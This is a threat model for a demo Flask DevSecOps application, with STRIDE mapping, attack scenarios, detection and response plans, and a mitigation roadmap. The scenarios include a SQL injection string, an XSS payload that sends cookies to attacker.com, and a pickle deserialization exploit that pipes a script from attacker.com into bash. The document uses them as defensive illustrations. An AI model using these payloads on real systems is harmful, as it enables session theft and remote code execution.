# Threat Model: Demo DevSecOps

Comprehensive threat modeling, attack scenarios, and threat hunting methodology for the demo-devsecops application.

---

## Overview

This document details:
- **Asset identification** - What we're protecting
- **Threat identification** - What could go wrong
- **Vulnerability mapping** - How attacks could happen
- **Risk assessment** - Which threats matter most
- **Mitigation strategies** - How to defend

---

## 1. Asset Identification

### Critical Assets

| Asset | Type | Impact if Breached | Sensitivity |
|-------|------|-------------------|-------------|
| User Credentials | Data | High - Account takeover | Critical |
| User Data (PII) | Data | High - Privacy violation | Critical |
| Authentication Tokens | System | Critical - Session hijacking | Critical |
| Admin Privileges | Access | Critical - Full system control | Critical |
| Database | Infrastructure | Critical - Data loss | Critical |
| Application Code | Intellectual Property | Medium - Code theft | High |
| Server Configuration | Infrastructure | High - System compromise | High |
| Session Cookies | System | High - Session fixation | High |

### Asset Value Rating

**CRITICAL (Immediate Response Required):**
- User authentication credentials
- Admin authentication tokens
- Database access
- User personally identifiable information (PII)

**HIGH (Address Promptly):**
- Session management
- API authentication
- Application configuration
- Error messages revealing system info

**MEDIUM (Plan Remediation):**
- Application source code
- Internal documentation
- System logs
- Development credentials

---

## 2. Threat Actors & Motivations

### External Threats

#### 2.1 Opportunistic Attackers
**Motivation:** Financial gain, data theft  
**Skills:** Low to Medium  
**Methods:**
- SQL injection automated scanning
- XSS payload injection
- Default credential testing
- Known vulnerability exploitation

**Likelihood:** HIGH  
**Impact:** High - database breach, account takeover

---

#### 2.2 Organized Cybercriminals
**Motivation:** Financial gain, ransomware, data sale  
**Skills:** High  
**Methods:**
- Custom exploit development
- Social engineering
- Supply chain attacks
- Persistence mechanisms

**Likelihood:** MEDIUM  
**Impact:** Critical - complete system compromise

---

#### 2.3 Nation-State Actors
**Motivation:** Espionage, intellectual property theft  
**Skills:** Very High  
**Methods:**
- Zero-day exploits
- Advanced persistence
- Sophisticated social engineering
- Supply chain compromise

**Likelihood:** LOW (unless high-value target)  
**Impact:** Critical - complete system compromise

---

#### 2.4 Script Kiddies
**Motivation:** Notoriety, learning  
**Skills:** Low  
**Methods:**
- Public exploit code
- Automated scanning tools
- Known vulnerability lists
- Copy-paste attacks

**Likelihood:** HIGH  
**Impact:** Medium - defacement, basic compromise

---

### Internal Threats

#### 2.5 Disgruntled Employees
**Motivation:** Revenge, financial gain  
**Skills:** Medium to High  
**Methods:**
- Privilege abuse
- Data exfiltration
- Credential misuse
- System sabotage

**Likelihood:** MEDIUM  
**Impact:** Critical - insider knowledge

---

#### 2.6 Negligent Users
**Motivation:** None (unintentional)  
**Skills:** Low  
**Methods:**
- Weak password selection
- Credential sharing
- Phishing susceptibility
- Misconfig mistakes

**Likelihood:** HIGH  
**Impact:** Medium - accidental exposure

---

## 3. Attack Surface Analysis

### External Attack Surface

```
Internet
  ↓
Firewall
  ↓
Web Application (Flask)
  ├─ HTTP Endpoints
  ├─ Authentication API
  ├─ User Input Fields
  ├─ Session Cookies
  └─ File Upload Features
  ↓
Backend Services
  ├─ Database
  ├─ Cache
  └─ Logging
```

### Attack Entry Points

| Entry Point | Vulnerability | Attack Vector |
|-------------|---|---|
| Login Form | Broken Auth (A07) | Brute force, credential stuffing |
| Search Box | Injection (A05) | SQL injection, XSS |
| User Profile | Broken Access Control (A01) | IDOR, privilege escalation |
| Admin Panel | Missing Auth | Direct access without credentials |
| API Endpoints | Insecure Design (A06) | Unexpected behavior, bypass |
| Session Cookies | Cryptographic Failures (A04) | Session fixation, prediction |
| File Upload | Integrity Failures (A08) | Malicious code injection |
| Error Messages | Security Misconfiguration (A02) | Information disclosure |

---

## 4. STRIDE Threat Mapping

### STRIDE Categories

- **S**poofing: Identity spoofing
- **T**ampering: Data modification
- **R**epudiation: Denying actions
- **I**nformation Disclosure: Exposing secrets
- **D**enial of Service: Service unavailability
- **E**levation of Privilege: Unauthorized access

### Application Threats

#### Spoofing (Identity)

| Threat | Description | Risk | Mitigation |
|--------|---|---|---|
| Account Takeover | Attacker logs in as legitimate user | Critical | MFA, rate limiting, account lockout |
| Session Hijacking | Steal session cookies | Critical | Secure flags, HTTPS, token rotation |
| API Impersonation | Fake API requests | High | API signatures, mutual TLS |
| Credential Theft | Phishing or password reuse | High | Password manager education, SSO |

**Example Attack:**
```
1. Attacker obtains user password via phishing
2. Logs in as legitimate user
3. Accesses sensitive data
4. Modifies account settings
5. User doesn't notice until too late
```

---

#### Tampering (Data Modification)

| Threat | Description | Risk | Mitigation |
|--------|---|---|---|
| SQL Injection | Modify database queries | Critical | Parameterized queries, ORM |
| XSS Injection | Modify page content | High | Input sanitization, output encoding |
| CSRF | Modify data via user's browser | High | CSRF tokens, SameSite cookies |
| Man-in-the-Middle | Intercept and modify traffic | Critical | HTTPS, HSTS |

**Example Attack (SQL Injection):**
```
1. Attacker inputs: ' OR '1'='1
2. Query becomes: SELECT * FROM users WHERE username = '' OR '1'='1'
3. Returns all users
4. Attacker escalates to DELETE or UPDATE commands
5. Modifies user records or deletes data
```

---

#### Repudiation (Denying Actions)

| Threat | Description | Risk | Mitigation |
|--------|---|---|---|
| Unlogged Actions | No audit trail | Medium | Comprehensive logging |
| Claim Non-Involvement | Deny performing actions | Medium | Digital signatures, timestamps |
| False Timestamp | Claim actions happened differently | Low | Centralized logging |

**Example Scenario:**
```
Attacker modifies user data
→ No logs to prove who did it
→ Can claim "it wasn't me"
→ Company can't prosecute
```

---

#### Information Disclosure

| Threat | Description | Risk | Mitigation |
|--------|---|---|---|
| Plaintext Passwords | Users exposed | Critical | Hash passwords with Argon2 |
| PII Exposure | Privacy violation | Critical | Encryption at rest, access control |
| Source Code Leakage | Intellectual property loss | High | Secure repositories, code review |
| Debug Information | Stack traces in errors | Medium | Generic error messages |
| Logs Exposure | Sensitive data in logs | Medium | Redact PII from logs |

**Example Attack (Debug Info Leakage):**
```
1. Attacker triggers error
2. Error message shows: "File not found: /var/www/app/config.db"
3. Attacker now knows directory structure
4. Attacker knows database technology
5. Can target specific exploits
```

---

#### Denial of Service (DoS)

| Threat | Description | Risk | Mitigation |
|--------|---|---|---|
| Resource Exhaustion | Crash application | Medium | Rate limiting, WAF |
| Infinite Loops | CPU maxed out | Medium | Timeout mechanisms |
| Large Uploads | Disk space filled | Medium | File size limits |
| Database Flooding | Query overload | High | Query timeouts, limits |
| Bandwidth Flooding | Network saturated | Medium | DDoS protection |

**Example Attack:**
```
1. Attacker sends 1000 requests/second
2. Flask can't handle load
3. Application becomes unresponsive
4. Legitimate users can't access service
5. User trust decreases
```

---

#### Elevation of Privilege (EoP)

| Threat | Description | Risk | Mitigation |
|--------|---|---|---|
| Broken Access Control | Access admin features as user | Critical | Authorization checks |
| Privilege Escalation | Gain higher privileges | Critical | RBAC, least privilege |
| Unprotected APIs | Direct access without auth | Critical | Authentication required |
| Session Fixation | Attacker sets user's session | High | Regenerate after login |

**Example Attack (IDOR - Insecure Direct Object Reference):**
```
1. Legitimate user accesses: /profile/123 (their profile)
2. Attacker tries: /profile/124 (another user)
3. No authorization check
4. Attacker sees: name, email, SSN, phone number
5. Attacker can modify data or delete account
```

---

## 5. Attack Scenarios

### Scenario 1: SQL Injection → Data Breach

**Threat Actor:** Opportunistic Attacker  
**Entry Point:** Login form  
**Timeline:** 5 minutes  
**Severity:** CRITICAL

```
Step 1: Reconnaissance
- Attacker identifies SQL injection vulnerability
- Tests username field: ' OR '1'='1
- Returns all user records

Step 2: Exploitation
- Attacker extracts all user data:
  * Usernames
  * Password hashes
  * Email addresses
  * Phone numbers
  * SSNs

Step 3: Post-Exploitation
- Attacker cracks password hashes (weak MD5)
- Gains access to user accounts
- Escalates to admin account
- Downloads entire database

Step 4: Exfiltration
- Attacker sells user data on dark web
- Users experience identity theft
- Company faces lawsuits
- Regulatory fines (GDPR, etc.)

Impact: CRITICAL
- 100,000+ users affected
- Estimated cost: $1M+ in fines + remediation
```

**Detection:**
- Database access logs show unusual queries
- Bandit flags SQL query in code
- IDS detects SQL injection patterns
- Database logs show SELECT * queries

**Response:**
```
Immediate (0-1 hour):
1. Isolate affected database servers
2. Stop all traffic to application
3. Enable detailed logging
4. Notify incident response team

Short-term (1-24 hours):
1. Conduct forensic analysis
2. Determine scope of breach
3. Notify affected users
4. Begin password reset process

Long-term (1-30 days):
1. Implement parameterized queries
2. Add WAF (Web Application Firewall)
3. Deploy IDS/IPS
4. Security awareness training
```

---

### Scenario 2: XSS → Account Takeover

**Threat Actor:** Organized Cybercriminal  
**Entry Point:** Comment section  
**Timeline:** 1 hour  
**Severity:** CRITICAL

```
Step 1: Malicious Payload Creation
Attacker crafts JavaScript:
<img src=x onerror="fetch('http://attacker.com/steal?cookie='+document.cookie)">

Step 2: Injection
- Attacker posts comment with malicious JS
- Code stored in database
- Executed whenever user views comment

Step 3: Cookie Theft
- User visits page with malicious comment
- JavaScript executes automatically
- Sends user's session cookie to attacker
- Attacker obtains: sessionid, auth token

Step 4: Session Hijacking
- Attacker uses stolen cookie
- Logs in as victim user
- Accesses all victim's data
- Changes password (locks out victim)
- Escalates to admin if victim is admin

Impact: CRITICAL
- User account compromised
- Data accessed and potentially modified
- Reputation damage
- User trust lost
```

**Detection:**
- WAF flags JavaScript injection
- Content Security Policy violations
- User reports suspicious activity
- Bandit flags unsafe string interpolation

**Response:**
```
Immediate:
1. Disable comment feature
2. Clear infected comments
3. Force password resets
4. Invalidate all sessions

Short-term:
1. Implement input sanitization
2. Add output encoding
3. Deploy Content Security Policy (CSP)
4. Enable HTTPOnly flag on cookies

Long-term:
1. Regular XSS testing
2. Security awareness training
3. Code review process
4. SAST tool integration
```

---

### Scenario 3: Broken Access Control → Privilege Escalation

**Threat Actor:** Script Kiddie  
**Entry Point:** User profile endpoint  
**Timeline:** 10 minutes  
**Severity:** CRITICAL

```
Step 1: Reconnaissance
- Attacker logs in as regular user
- Notices URL: /profile/456 (their user ID)

Step 2: Hypothesis
- Attacker tries: /profile/1 (admin user?)
- Server returns admin profile data
- No authorization check!

Step 3: Exploitation
- Attacker can now:
  * /profile/1 → View admin data
  * /admin/users → List all users
  * /admin/users/1/delete → Delete users
  * /admin/settings → Change app settings

Step 4: Privilege Escalation
- Attacker finds: /admin/promote?user_id=456
- Attacker promotes themselves to admin
- Now has full system access

Step 5: Persistence
- Attacker creates backdoor user account
- Ensures continued access even if caught
- Modifies audit logs to hide tracks

Impact: CRITICAL
- Complete system compromise
- All user data accessible
- Attacker can modify any data
- Difficult to detect and remediate
```

**Detection:**
- Access logs show unusual endpoints
- User profile access increases suddenly
- Unauthorized admin actions logged
- Manual testing reveals IDOR

**Response:**
```
Immediate:
1. Review all user escalations
2. Audit all admin actions (past 30 days)
3. Revoke suspicious admin accounts
4. Enable detailed access logging

Short-term:
1. Implement authorization checks
2. Add role-based access control (RBAC)
3. Validate user ownership of resources
4. Implement audit logging

Long-term:
1. Security code review
2. DAST testing (ZAP/Burp)
3. Penetration testing
4. Continuous monitoring
```

---

### Scenario 4: Insecure Deserialization → RCE

**Threat Actor:** Nation-State Actor  
**Entry Point:** Session cookie  
**Timeline:** Complex, multi-stage  
**Severity:** CRITICAL

```
Step 1: Reconnaissance
- Attacker analyzes application
- Notices: pickle.loads(request.cookies.get('session'))
- Identifies RCE vulnerability

Step 2: Payload Crafting
Attacker creates Python pickle with code execution:
```python
import os
class Exploit:
    def __reduce__(self):
        return (os.system, ('curl http://attacker.com/shell.sh | bash',))

payload = pickle.dumps(Exploit())
```

Step 3: Injection
- Attacker modifies session cookie with payload
- Sends request with malicious cookie
- Server unpickles → Code executes!

Step 4: Remote Code Execution
- Attacker now executes arbitrary commands
- Downloads reverse shell
- Establishes persistent backdoor
- Becomes system administrator

Step 5: Post-Exploitation
- Attacker installs rootkit
- Covers tracks in logs
- Exfiltrates sensitive data
- Sets up C&C communication
- Prepares for lateral movement

Impact: CATASTROPHIC
- Complete server compromise
- Data exfiltration
- Persistent backdoor
- Difficult to detect
- Potential network compromise
```

**Detection:**
- Network intrusion detection (IDS) alerts
- Unexpected child processes
- Unusual network connections
- Disk activity anomalies
- Code review finds pickle usage

**Response:**
```
EMERGENCY - Immediate (0-30 min):
1. Isolate affected servers
2. Kill suspicious processes
3. Capture memory dump
4. Notify law enforcement (if APT)

Short-term (24-48 hours):
1. Complete forensic analysis
2. Identify lateral movement
3. Rebuild all systems from scratch
4. Reset all credentials

Long-term (weeks):
1. Replace pickle with JSON
2. Implement strict code review
3. Deploy endpoint detection/response (EDR)
4. Advanced threat hunting
5. Incident post-mortem
```

---

## 6. Risk Assessment Matrix

### Risk Ratings

```
RISK = Likelihood × Impact × Exploitability

Risk Level:
- CRITICAL: Immediate remediation required (Risk > 8)
- HIGH: Address within 1 week (Risk 6-8)
- MEDIUM: Address within 1 month (Risk 4-6)
- LOW: Address in regular updates (Risk < 4)
```

### Threat Risk Table

| Threat | Likelihood | Impact | Exploitability | Risk | Priority |
|--------|-----------|--------|-----------------|------|----------|
| SQL Injection | 9/10 | 10/10 | 9/10 | **CRITICAL** | **1** |
| XSS | 8/10 | 9/10 | 8/10 | **CRITICAL** | **2** |
| Broken Access Control | 9/10 | 10/10 | 9/10 | **CRITICAL** | **3** |
| Insecure Deserialization | 6/10 | 10/10 | 8/10 | **CRITICAL** | **4** |
| Weak Authentication | 8/10 | 9/10 | 7/10 | **HIGH** | **5** |
| Missing Security Headers | 7/10 | 6/10 | 8/10 | **HIGH** | **6** |
| Weak Cryptography | 5/10 | 8/10 | 6/10 | **MEDIUM** | **7** |

---

## 7. Threat Hunting Checklist

### Daily Checks

- [ ] Review access logs for unusual patterns
- [ ] Check for failed authentication attempts
- [ ] Monitor resource usage (CPU, disk, memory)
- [ ] Review application errors
- [ ] Check for new user accounts
- [ ] Verify no unauthorized admin actions

### Weekly Checks

- [ ] Run Bandit security scan
- [ ] Run Safety dependency check
- [ ] Review file integrity
- [ ] Audit user permissions
- [ ] Check SSL certificate validity
- [ ] Review firewall logs

### Monthly Checks

- [ ] Full vulnerability scan
- [ ] Penetration testing
- [ ] Source code review
- [ ] Dependency update audit
- [ ] Security policy review
- [ ] Incident log review

### Quarterly Checks

- [ ] Full threat assessment
- [ ] Red team exercise
- [ ] Security training
- [ ] Disaster recovery test
- [ ] Vendor security assessment

---

## 8. Detection & Logging

### Critical Events to Log

```
1. Authentication Events
   - Login attempts (success/failure)
   - Password changes
   - Account lockouts
   - Token generation/revocation

2. Authorization Events
   - Access to sensitive resources
   - Failed authorization attempts
   - Privilege changes
   - Role modifications

3. Data Events
   - Data access
   - Data modification
   - Data deletion
   - Database queries (errors)

4. System Events
   - Service restarts
   - Configuration changes
   - Error conditions
   - Security alerts

5. Network Events
   - Connection establishment
   - Unusual network activity
   - DDoS patterns
   - Port scanning
```

### Log Format (JSON)

```json
{
  "timestamp": "2024-06-10T14:30:45Z",
  "event_type": "authentication_failure",
  "user": "attacker@example.com",
  "source_ip": "192.168.1.100",
  "resource": "/login",
  "reason": "Invalid password",
  "severity": "MEDIUM",
  "action_taken": "Account locked after 5 attempts"
}
```

---

## 9. Threat Hunting Tools

### Recommended Tools

| Tool | Purpose | Detection Type |
|------|---------|---|
| **Bandit** | Source code analysis | SAST |
| **Safety** | Dependency scanning | SCA |
| **OWASP ZAP** | Web app scanning | DAST |
| **Burp Suite** | Manual testing | DAST |
| **Snyk** | Vulnerability tracking | SCA |
| **Splunk** | Log analysis | SIEM |
| **ELK Stack** | Logging platform | SIEM |
| **Prometheus** | Metrics monitoring | APM |
| **Osquery** | Endpoint monitoring | EDR |

---

## 10. Mitigation Roadmap

### Phase 1: Critical (Week 1-2)

- [ ] Implement parameterized SQL queries
- [ ] Add input validation and sanitization
- [ ] Enable security headers
- [ ] Implement rate limiting
- [ ] Enable HTTPOnly flag on cookies

### Phase 2: High (Week 3-4)

- [ ] Replace pickle with JSON
- [ ] Implement CSRF protection
- [ ] Add logging and monitoring
- [ ] Deploy WAF (Web Application Firewall)
- [ ] Implement RBAC

### Phase 3: Medium (Month 2)

- [ ] Upgrade cryptography
- [ ] Add API authentication
- [ ] Implement IDS/IPS
- [ ] Security training program
- [ ] Automated testing

### Phase 4: Long-term (Ongoing)

- [ ] Penetration testing program
- [ ] Bug bounty program
- [ ] Security posture monitoring
- [ ] Threat intelligence integration
- [ ] Incident response drills

---

## 11. References

- **OWASP Top 10 2025:** https://owasp.org/Top10/2025/
- **OWASP Testing Guide:** https://owasp.org/www-project-web-security-testing-guide/
- **MITRE ATT&CK:** https://attack.mitre.org/
- **CWE Top 25:** https://cwe.mitre.org/top25/
- **NIST Cybersecurity Framework:** https://www.nist.gov/cyberframework
- **SANS Top 25:** https://www.sans.org/top25-software-errors/


